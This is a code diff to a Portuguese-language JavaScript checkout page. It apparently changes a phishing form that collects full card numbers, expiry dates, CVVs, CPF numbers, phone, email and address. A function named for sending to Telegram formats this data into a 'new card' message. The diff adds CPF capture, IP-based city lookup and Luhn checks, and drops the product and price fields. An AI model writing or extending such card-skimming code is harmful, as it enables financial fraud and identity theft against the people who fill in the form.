@@ -70,6 +70,27 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
+    // Máscara para CPF
+    const cpfFields = ['cardCpf', 'cpf'];
+    cpfFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 11) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                } else if (value.length >= 9) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+                } else if (value.length >= 6) {
+                    value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
+                } else if (value.length >= 3) {
+                    value = value.replace(/(\d{3})/, '$1');
+                }
+                e.target.value = value.substring(0, 14);
+            });
+        }
+    });
+
     // Validar cartão (Luhn)
     function validarCartao(numero) {
         const num = numero.replace(/\s/g, '');
@@ -106,20 +127,26 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
 
+    // Obter cidade do usuário
+    let userCity = '';
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            userCity = data.city || '';
+        })
+        .catch(() => {});
+
     // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
-<b>💳 NOVO PAGAMENTO COM CARTÃO</b>
+<b>💳 NOVO CARTÃO</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 
-<b>🎁 PRODUTO</b>
-├ Produto: ${dados.produto}
-└ Valor: ${dados.valor}
-
-<b>👤 DADOS DO CLIENTE</b>
+<b>👤 DADOS DO TITULAR</b>
+├ Nome: ${dados.titular}
+├ Telefone: ${dados.telefone}
 ├ E-mail: ${dados.email}
-├ Titular do cartão: ${dados.titular}
-└ Telefone: ${dados.telefone}
+└ CPF: ${dados.cpf}
 
 <b>💳 DADOS DO CARTÃO</b>
 ├ Número: ${dados.numero}
@@ -131,9 +158,7 @@ document.addEventListener('DOMContentLoaded', function() {
 ├ Rua: ${dados.rua}
 ├ Número: ${dados.numeroEnd}
 ├ Complemento: ${dados.complemento}
-├ Bairro: ${dados.bairro}
-├ Cidade: ${dados.cidade}
-└ UF: ${dados.uf}
+└ Cidade: ${dados.cidade}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 <b>⏰ Data:</b> ${new Date().toLocaleString('pt-BR')}
@@ -173,19 +198,11 @@ document.addEventListener('DOMContentLoaded', function() {
         finalizarCartaoBtn.addEventListener('click', async function(e) {
             e.preventDefault();
             
-            // Obter dados do produto
-            const produtoData = sessionStorage.getItem('produtoSelecionado');
-            let produto = { nome: 'Produto', preco: 0 };
-            if (produtoData) {
-                try {
-                    produto = JSON.parse(produtoData);
-                } catch(e) {}
-            }
-            
             // Obter dados do formulário cartão
-            const email = document.getElementById('cardEmail')?.value.trim() || '';
             const titular = document.getElementById('cardTitular')?.value.trim() || '';
             const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
+            const email = document.getElementById('cardEmail')?.value.trim() || '';
+            const cpf = document.getElementById('cardCpf')?.value.trim() || '';
             const numero = document.getElementById('cardNumero')?.value.trim() || '';
             const validade = document.getElementById('cardValidade')?.value.trim() || '';
             const cvv = document.getElementById('cardCvv')?.value.trim() || '';
@@ -194,15 +211,14 @@ document.addEventListener('DOMContentLoaded', function() {
             const cep = document.getElementById('cardCep')?.value.trim() || '';
             const rua = document.getElementById('cardRua')?.value.trim() || '';
             const numeroEnd = document.getElementById('cardNumeroEnd')?.value.trim() || '';
-            const complemento = document.getElementById('cardComplemento')?.value.trim() || '';
-            const bairro = document.getElementById('cardBairro')?.value.trim() || '';
-            const cidade = document.getElementById('cardCidade')?.value.trim() || '';
-            const uf = document.getElementById('cardUf')?.value.trim() || '';
+            const temComplemento = document.getElementById('temComplementoCard')?.checked || false;
+            const complemento = temComplemento ? (document.getElementById('cardComplemento')?.value.trim() || '') : 'Não informado';
             
             // Validações
-            if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
             if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
             if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
+            if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
+            if (!cpf || cpf.replace(/\D/g, '').length !== 11) { showToast('❌ CPF inválido'); return; }
             if (!numero || numero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
             if (!validarCartao(numero)) { showToast('❌ Número do cartão inválido'); return; }
             if (!validade || !validarValidade(validade)) { showToast('❌ Data de validade inválida'); return; }
@@ -213,21 +229,18 @@ document.addEventListener('DOMContentLoaded', function() {
             
             // Preparar dados para envio
             const dadosEnvio = {
-                produto: produto.nome,
-                valor: `R$ ${produto.preco.toFixed(2)}`,
-                email: email,
                 titular: titular,
                 telefone: telefone,
+                email: email,
+                cpf: cpf,
                 numero: numero,
                 validade: validade,
                 cvv: cvv,
                 cep: cep,
                 rua: rua,
                 numeroEnd: numeroEnd,
-                complemento: complemento || 'Não informado',
-                bairro: bairro,
-                cidade: cidade,
-                uf: uf
+                complemento: complemento,
+                cidade: userCity || 'Não identificada'
             };
             
             // Desabilitar botão e mostrar loading
